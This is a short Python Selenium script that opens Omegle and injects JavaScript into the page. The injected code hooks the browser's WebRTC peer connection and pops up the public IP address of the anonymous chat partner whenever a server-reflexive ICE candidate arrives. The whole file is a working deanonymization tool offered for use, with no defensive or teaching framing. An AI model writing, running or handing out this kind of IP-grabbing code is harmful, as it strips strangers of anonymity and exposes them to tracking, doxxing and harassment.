from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from getpass import getuser

browser = webdriver.Firefox(executable_path="C:/Users/{}/Desktop/geckodriver.exe".format(getuser()))

browser.get('https://omegle.com')

code = '''
window.oRTCPeerConnection  = window.oRTCPeerConnection || window.RTCPeerConnection

window.RTCPeerConnection = function(...args) {
 const pc = new window.oRTCPeerConnection(...args)

pc.oaddIceCandidate = pc.addIceCandidate

pc.addIceCandidate = function(iceCandidate, ...rest) {
 const fields = iceCandidate.candidate.split(' ')

if (fields[7] === 'srflx') {
confirm(fields[4]);
}
return pc.oaddIceCandidate(iceCandidate, ...rest)

}

return pc
}
'''

browser.execute_script(code)

video = browser.find_element_by_id('videobtn').click()